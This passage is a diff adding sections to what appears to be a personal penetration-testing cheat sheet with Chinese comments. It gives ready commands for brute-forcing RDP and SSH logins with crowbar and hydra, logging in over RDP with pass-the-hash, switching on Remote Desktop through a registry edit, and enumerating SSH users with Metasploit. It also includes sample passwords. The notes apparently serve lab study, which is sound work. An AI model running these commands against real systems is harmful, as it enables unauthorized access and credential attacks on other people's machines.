@@ -146,11 +146,67 @@ psexec.py 'administrator'@192.168.0.22 -hashes :$hash
 
 # RDP
 ```bash
+TCP 3389
+```
+Crack
+```bash
+# crowbar
+sudo apt install -y crowbar 
+git clone https://github.com/galkan/crowbar
+apt-get install -y nmap openvpn freerdp-x11 vncviewer
+# -v: 輸出詳細資訊
+crowbar [-v] -b rdp -s <IP/CIDR> -u user -c password
+crowbar [-v] -b rdp -s <IP/CIDR> -U Users.txt -C Passwords.txt
+
+# hydra
+hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'
+```
+xfreerdp
+```bash
+# Environment
+sudo dpkg –l | grep freerdp
+# 以下全部都要2.3version以上
+freerdp2-x11
+libfreerdp2-2
+libfreerdp-client2-2
+
+# update
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 823BF07CEB5C469B
+
+# Access
+xfreerdp /size:90% /v:<rdp_IP> /u:<user> /p:<password>
+xfreerdp /size:90% /v:192.168.0.7 /u:'administrator' /p:'Pa$$w0rd'
+
+xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
+```
+reg
+```bash
+# Windows遠桌開關
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
-# Machine Information Scan
+# SSH
+Metasploit
 ```bash
-# Computer Name
-# OS / Server Version
-# SSH key
+msfconsole -q
+
+use auxiliary/scanner/ssh/ssh_enumusers
+set rhosts <IP>
+set user_file Wordlist/Username.txt
+set check_false true
+exploit
+```
+hydra
+```bash
+hydra -t 4 -l <username> -P <passwords.txt> ssh://<ssh_IP>
+hydra -t 4 -L <users.txt> -P <passwords.txt> ssh://<ssh_IP>
+
+hydra -t 4 -l administrator -p 'Infinit3' ssh://192.168.0.70
+```
+# owaspbwa
+```bash
+# 忘了這是幹嘛的
+owaspbwa
+
+Pa$$w0rd123
 ```
